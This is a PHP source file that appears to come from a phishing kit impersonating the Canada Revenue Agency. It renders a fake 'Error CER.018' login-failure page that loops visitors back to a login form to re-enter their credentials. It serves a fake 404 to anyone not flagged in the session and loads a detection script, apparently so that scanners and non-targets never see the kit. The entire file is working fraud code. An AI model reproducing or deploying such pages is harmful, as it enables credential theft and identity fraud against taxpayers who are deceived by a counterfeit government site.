<?php
session_start();
ob_start();
require_once('../config.php');
include_once('../includes/php/detect.php');

if(!isset($_SESSION['fallow'])) {
   header('HTTP/1.1 404 Not Found');
   exit();
}
?>
<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
      <link rel="stylesheet" href="./reg.css">
   </head>
   <body>
      </header>
      <?php include ("files/head.php"); ?>
      <div id="brand-container-cra">
         <div class="container">
            <div class="row">
               <div class="col-xs-12 col-sm-10" id="brand-text-cra">
                  Canada Revenue Agency
               </div>
               <div class="col-xs-4 col-sm-2 text-right">
               </div>
            </div>
         </div>
      </div>
      <main role="main" property="mainContentOfPage" class="container">
         <div class="left">
         </div>
         <main role="main" property="mainContentOfPage" class="container">
            <script type="text/javascript">
               document.title = "Canada Revenue Agency - Error CER.018 | Agence du revenu du Canada - Erreur CER.018";
            </script>
            <div class="col-md-12">
               <h1>Error — CER.018</h1>
               <p>The user ID and/or password you entered are not correct.</p>
               <p>
                  <a href="">I forgot my user ID</a>
               </p>
               <p><a href="forgotpass.php">I forgot my password</a> </p>
               <div class="formButtons">
                  <form action="login.php" method="post">
                     <input type="submit" class="btn btn-default" value="Try again">
                  </form>
               </div>
            </div>
         </main>
         <div>
            <dl id="wb-dtmd" property="dateModified">
               <dt>Date modified: </dt>
               <dd><time>2024-02-05</time></dd>
            </dl>
         </div>
      </main>
      <?php include ("files/footer.php"); ?>
